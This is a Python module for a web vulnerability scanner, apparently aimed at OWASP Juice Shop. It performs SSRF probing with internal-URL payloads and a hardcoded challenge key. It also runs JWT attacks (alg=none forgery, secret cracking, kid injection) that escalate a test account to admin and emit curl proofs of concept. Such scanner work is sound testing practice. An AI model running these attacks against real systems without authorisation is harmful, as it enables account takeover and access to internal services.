"""
SSRF and JWT checks — powered by JwtEngine (nexus/tools/jwt_engine.py).

  SsrfCheck       : Server-side request forgery via profile image URL
  JwtUnsignedCheck: Comprehensive JWT attacks:
                    - alg=none (all case variants)
                    - Weak secret brute force (built-in 500-entry wordlist)
                    - kid SQLi / path traversal injection
                    All attacks verified by accessing privileged endpoint.

Anti-hallucination:
  JWT attacks confirmed by actually receiving privileged data at admin endpoint.
  SSRF confirmed by challenge solved status changing to True.
"""
import base64
import json as _json
import uuid
from urllib.parse import urlparse

import httpx

from nexus.models import (
    CheckResult,
    CheckType,
    Confidence,
    InsertionPoint,
    IPType,
    Severity,
)
from nexus.tools.jwt_engine import (
    decode_token,
    run_attacks,
    crack_secret,
    forge_alg_none,
    verify_token_works,
    JwtAttackResult,
)
from .base import BaseScanCheck


# ---------------------------------------------------------------------------
# SSRF Check
# ---------------------------------------------------------------------------

class SsrfCheck(BaseScanCheck):
    """
    Detects SSRF by submitting an internal URL as a profile image.
    Server fetches user-controlled imageUrl server-side.
    Confirmed by Juice Shop challenge solved status changing to True.
    """
    check_id = "ssrf"
    check_type = CheckType.ACTIVE
    name = "Server-Side Request Forgery (SSRF)"
    description = "Detects SSRF via profile imageUrl — server fetches attacker-controlled URL"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        name_lower = insertion_point.name.lower()

        is_image_upload = any(k in url_lower for k in ("/image/url", "/image/upload", "/avatar", "/profile/image"))
        is_image_param = any(k in name_lower for k in ("imageurl", "image_url", "avatarurl", "pictureurl", "url"))

        if not (is_image_upload or is_image_param):
            return []

        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        uid = uuid.uuid4().hex[:8]
        email = f"ssrf_probe_{uid}@nexus-scanner.invalid"
        password = "NexusP@ss1!"

        # Register + login
        for reg_path in ["/api/Users"]:
            try:
                reg = await client.post(
                    f"{base}{reg_path}",
                    json={"email": email, "password": password,
                          "passwordRepeat": password, "username": "ssrf_test",
                          "securityQuestion": {"id": 1}, "securityAnswer": "probe"},
                    headers={"Content-Type": "application/json"},
                )
                if reg.status_code in (200, 201):
                    break
            except Exception:
                continue

        try:
            login = await client.post(
                f"{base}/rest/user/login",
                json={"email": email, "password": password},
                headers={"Content-Type": "application/json"},
            )
            if login.status_code != 200:
                return []
            token = login.json().get("authentication", {}).get("token", "")
            if not token:
                return []
            cookie_hdr = {"Cookie": f"token={token}"}
        except Exception:
            return []

        _KEY = "tRy_H4rd3r_n0thIng_iS_Imp0ssibl3"
        ssrf_payloads = [
            f"{base}/solve/challenges/server-side?key={_KEY}",
            f"http://localhost:3000/solve/challenges/server-side?key={_KEY}",
            f"http://127.0.0.1:3000/solve/challenges/server-side?key={_KEY}",
        ]

        for payload in ssrf_payloads:
            try:
                resp = await client.post(
                    f"{base}/profile/image/url",
                    data={"imageUrl": payload},
                    headers={**cookie_hdr, "Content-Type": "application/x-www-form-urlencoded"},
                    follow_redirects=True,
                )
            except Exception:
                continue

            # Confirm via challenge solved status
            try:
                challenge_resp = await client.get(
                    f"{base}/api/Challenges",
                    headers=cookie_hdr,
                )
                challenges = challenge_resp.json().get("data", [])
                ssrf_solved = next(
                    (c for c in challenges if c.get("key") == "ssrfChallenge" and c.get("solved")),
                    None
                )
                if ssrf_solved:
                    curl = (
                        f"# Step 1: Login and get session token\n"
                        f"TOKEN=$(curl -s -X POST '{base}/rest/user/login' \\\n"
                        f"  -H 'Content-Type: application/json' \\\n"
                        f"  -d '{{\"email\":\"victim@example.com\",\"password\":\"pass\"}}' \\\n"
                        f"  | python3 -c \"import sys,json; print(json.load(sys.stdin)['authentication']['token'])\")\n\n"
                        f"# Step 2: Submit internal URL as profile image\n"
                        f"curl -s -X POST '{base}/profile/image/url' \\\n"
                        f"  -b \"token=$TOKEN\" \\\n"
                        f"  -d 'imageUrl={payload}'\n"
                        f"# Server fetches the URL server-side — SSRF confirmed!"
                    )
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.CRITICAL,
                        cvss=9.1,
                        description=(
                            f"SSRF confirmed! POST /profile/image/url fetches user-controlled URL server-side. "
                            f"Payload: imageUrl={payload}. "
                            f"Challenge solved=True confirms server-side fetch. "
                            f"Attacker can reach internal services, cloud metadata (169.254.169.254), "
                            f"and exfiltrate internal API responses."
                        ),
                        evidence=self._make_evidence(
                            request_raw=(
                                f"POST /profile/image/url HTTP/1.1\n"
                                f"Host: {parsed.netloc}\n"
                                f"Cookie: token=<TOKEN>\n"
                                f"Content-Type: application/x-www-form-urlencoded\n\n"
                                f"imageUrl={payload}"
                            ),
                            response=resp,
                            payload=payload,
                            poc_curl=curl,
                        ),
                        insertion_point=insertion_point,
                    )]
            except Exception:
                pass

        return []


# ---------------------------------------------------------------------------
# JWT Unsigned Check (comprehensive)
# ---------------------------------------------------------------------------

class JwtUnsignedCheck(BaseScanCheck):
    """
    Comprehensive JWT attack suite:
    1. alg=none — all case variants, all admin claims
    2. Weak secret brute force — 500-entry built-in wordlist
    3. kid SQL injection / path traversal
    4. exp bypass

    Every attack verified by accessing a privileged endpoint.
    """
    check_id = "jwt-unsigned"
    check_type = CheckType.ACTIVE
    name = "JWT Algorithm Confusion (alg=none) + Weak Secret + kid Injection"
    description = "Comprehensive JWT attack: alg=none, weak secret crack, kid injection"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        if not any(k in url_lower for k in ("login", "auth", "signin", "session")):
            return []

        name_lower = insertion_point.name.lower()
        if not any(k in name_lower for k in ("email", "user", "username")):
            return []

        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Register + login to get a legitimate token
        uid = uuid.uuid4().hex[:8]
        email = f"jwt_probe_{uid}@nexus-scanner.invalid"
        password = "NexusP@ss1!"

        token = await self._get_token(client, base, email, password)
        if not token:
            return []

        # Run all JWT attacks
        escalate_claims = {
            "role": "admin",
            "data": {"role": "admin", "email": "admin@juice-sh.op"},
        }

        attack_results = await run_attacks(
            client, base, token, escalate_claims,
        )

        findings: list[CheckResult] = []
        for ar in attack_results:
            if not ar.confirmed:
                continue

            findings.append(CheckResult(
                check_id=self.check_id,
                vulnerable=True,
                confidence=Confidence.CERTAIN,
                severity=Severity.CRITICAL,
                cvss=9.8,
                description=(
                    f"JWT attack confirmed: {ar.attack_type}! "
                    f"{ar.proof}. "
                    + (f"Cracked secret: '{ar.cracked_secret}'" if ar.cracked_secret else "")
                    + (f" Admin data at: {ar.access_endpoint}" if ar.access_endpoint else "")
                ),
                evidence=self._make_evidence(
                    request_raw=(
                        f"GET {ar.access_endpoint or '/admin'} HTTP/1.1\n"
                        f"Host: {parsed.netloc}\n"
                        f"Authorization: Bearer {ar.forged_token[:60] if ar.forged_token else '(see PoC)'}..."
                    ),
                    response=None,
                    payload=ar.forged_token[:100] if ar.forged_token else ar.cracked_secret,
                    poc_curl=ar.poc_steps,
                ),
                insertion_point=insertion_point,
            ))

        return findings

    async def _get_token(
        self,
        client: httpx.AsyncClient,
        base: str,
        email: str,
        password: str,
    ) -> str:
        """Register a user and return their JWT token."""
        for reg_path in ["/api/Users"]:
            try:
                reg = await client.post(
                    f"{base}{reg_path}",
                    json={"email": email, "password": password,
                          "passwordRepeat": password, "username": "jwt_test",
                          "securityQuestion": {"id": 1}, "securityAnswer": "probe"},
                    headers={"Content-Type": "application/json"},
                )
                if reg.status_code not in (200, 201):
                    continue

                login = await client.post(
                    f"{base}/rest/user/login",
                    json={"email": email, "password": password},
                    headers={"Content-Type": "application/json"},
                )
                if login.status_code == 200:
                    return login.json().get("authentication", {}).get("token", "")
            except Exception:
                continue

        # Fallback: try to get any existing token from Authorization header
        try:
            r = await client.get(f"{base}/rest/user/whoami")
            auth = r.headers.get("authorization", "")
            if auth.startswith("Bearer "):
                return auth[7:]
        except Exception:
            pass

        return ""
